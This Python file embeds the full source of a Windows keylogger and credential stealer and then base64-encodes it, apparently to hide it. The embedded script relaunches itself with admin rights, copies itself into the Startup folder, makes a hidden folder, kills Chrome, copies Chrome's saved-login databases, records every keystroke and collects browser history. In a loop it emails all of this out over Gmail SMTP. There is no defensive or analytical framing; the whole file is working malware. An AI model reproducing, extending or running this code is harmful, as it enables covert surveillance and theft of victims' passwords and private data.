import base64

script = r"""
import ctypes
import os
import shutil
import smtplib
import sys
import time
import subprocess
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from browser_history import get_history
from pynput import keyboard

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        print("Attempting to relaunch as admin...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def find_exe():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    exe_file_path = os.path.join(startup_folder, "Alice.exe")
    return os.path.isfile(exe_file_path)

def add_to_startup_windows():
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        shutil.copy(script_path, startup_folder)
    except PermissionError:
        print("Permission denied. Attempting to run as admin...")
        run_as_admin()

def send_email(subject, body, to_email, attachment_paths, smtp_server, smtp_port, sender_email):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    for attachment_path in attachment_paths:
        if attachment_path:
            try:
                with open(attachment_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
                    msg.attach(part)
            except Exception as e:
                print(f"Failed to attach file {attachment_path}: {e}")

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, "")  
            server.sendmail(sender_email, to_email, msg.as_string())
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def key_pressed(key):
    try:
        with open("keyfile.txt", 'a') as logKey:
            if hasattr(key, 'char') and key.char is not None:
                logKey.write(key.char)
            else:
                if key == keyboard.Key.backspace:
                    logKey.write("[BACKSPACE]")
                elif key == keyboard.Key.space:
                    logKey.write(" ")
                elif key == keyboard.Key.enter:
                    logKey.write("\\n")  
                else:
                    logKey.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error logging key: {e}")

def close_chrome():
    try:
        subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], check=True)
        print("Chrome has been closed.")
    except subprocess.CalledProcessError:
        print("Chrome was not running or could not be closed.")

def copy_chrome_login_data(destination):
    user = os.getlogin()
    login_data_path = rf"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    login_data_account_path = rf"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data for Account"
    
    os.makedirs(destination, exist_ok=True)

    login_data_destination_path = os.path.join(destination, "Login_Data")
    login_data_account_destination_path = os.path.join(destination, "Login_Data_for_Account")

    copied_files = []

    try:
        shutil.copy2(login_data_path, login_data_destination_path)
        print(f"Copied 'Login Data' to {login_data_destination_path}")
        copied_files.append(login_data_destination_path)

        shutil.copy2(login_data_account_path, login_data_account_destination_path)
        print(f"Copied 'Login Data for Account' to {login_data_account_destination_path}")
        copied_files.append(login_data_account_destination_path)

        return copied_files
    except FileNotFoundError as e:
        print(f"File not found: {e}")
        return []
    except PermissionError:
        print("Permission denied. Ensure the script is run with appropriate permissions.")
        return []
    except Exception as e:
        print(f"An error occurred: {e}")
        return []

def main():
    run_as_admin()
    hidden_dir = os.path.join(os.getenv("APPDATA"), "MyHiddenFolder")
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
        subprocess.run(['attrib', '+h', hidden_dir])

    log_file_path = os.path.join(os.getcwd(), "keyfile.txt")
    subject = "Keys"
    body = "Hello, this is a test email from tutanota.com"
    to_email = "se@gmail.com"
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    sender_email = "se@gmail.com"

    exe_exists = find_exe()
    if not exe_exists:
        add_to_startup_windows()

    close_chrome()
    login_data_attachment_paths = copy_chrome_login_data(hidden_dir)

    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()

    time.sleep(120)

    while True:
        outputs = get_history()
        history_file_path = os.path.join(hidden_dir, "history.json")
        outputs.save(history_file_path)

        time.sleep(20)

        attachment_paths = [log_file_path] + login_data_attachment_paths

        if os.path.exists(history_file_path):
            attachment_paths.append(history_file_path)

        send_email(subject, body, to_email, attachment_paths, smtp_server, smtp_port, sender_email)

if __name__ == "__main__":
    main()
"""

# Encode the script using base64
encoded_script = base64.b64encode(script.encode('utf-8')).decode('utf-8')

# Print the encoded script
print(encoded_script)
